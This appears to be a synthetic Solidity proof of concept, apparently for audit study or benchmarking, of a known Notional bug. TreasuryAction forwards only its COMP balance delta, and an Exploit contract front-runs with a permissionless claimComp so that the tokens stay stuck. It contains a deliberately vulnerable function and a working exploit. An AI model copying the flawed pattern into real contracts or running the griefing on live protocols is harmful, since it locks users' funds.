// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Notional — TreasuryAction.claimCOMPAndTransfer harvests only the COMP
    balance delta (Code4rena 2022-01, finding 24655). SYNTHETIC, cheatcode-free.
    The delta lines are the audited body (@> VULN).
    Root cause: Comptroller.claimComp is permissionless. An attacker claims on
    behalf of TreasuryAction first, so the manager's later harvest sees a zero
    delta and the COMP sits in TreasuryAction forever. */

contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Compound Comptroller.claimComp is callable by anyone, for any holder.
contract Comptroller {
    MiniToken public comp;

    constructor(address _comp) {
        comp = MiniToken(_comp);
    }

    function claimComp(address holder, address[] calldata) external {
        uint256 amt = comp.balanceOf(address(this));
        if (amt != 0) comp.transfer(holder, amt);
    }
}

contract TreasuryAction {
    MiniToken public COMP;
    Comptroller public COMPTROLLER;
    address public treasuryManager;

    constructor(address _comp, address _comptroller, address _treasury) {
        COMP = MiniToken(_comp);
        COMPTROLLER = Comptroller(_comptroller);
        treasuryManager = _treasury;
    }

    function claimCOMPAndTransfer(address[] calldata cTokens) external returns (uint256) {
        uint256 balanceBefore = COMP.balanceOf(address(this));
        COMPTROLLER.claimComp(address(this), cTokens);
        uint256 balanceAfter = COMP.balanceOf(address(this));
        // @> VULN: only the delta is forwarded. A prior permissionless claimComp makes this 0.
        uint256 amountClaimed = balanceAfter - balanceBefore;
        if (amountClaimed != 0) COMP.transfer(treasuryManager, amountClaimed);
        return amountClaimed;
    }
}

contract Exploit {
    uint256 public constant STUCK = 1000e18;
    address public constant TREASURY = 0x000000000000000000000000000000000000D00d;

    MiniToken public comp; // nonce 1
    Comptroller public comptroller; // nonce 2
    TreasuryAction public action; // nonce 3
    uint256 public harvested;

    constructor() {
        comp = new MiniToken("Compound", "COMP");
        comptroller = new Comptroller(address(comp));
        action = new TreasuryAction(address(comp), address(comptroller), TREASURY);
        comp.mint(address(comptroller), STUCK);
    }

    function run() external {
        address[] memory cTokens = new address[](0);
        // Permissionless pre-claim. COMP moves onto TreasuryAction before the harvest snapshots.
        comptroller.claimComp(address(action), cTokens);
        harvested = action.claimCOMPAndTransfer(cTokens);
        require(harvested == 0, "harvest saw a delta");
        require(comp.balanceOf(TREASURY) == 0, "treasury was paid");
        require(comp.balanceOf(address(action)) == STUCK, "COMP not stuck");
    }
}
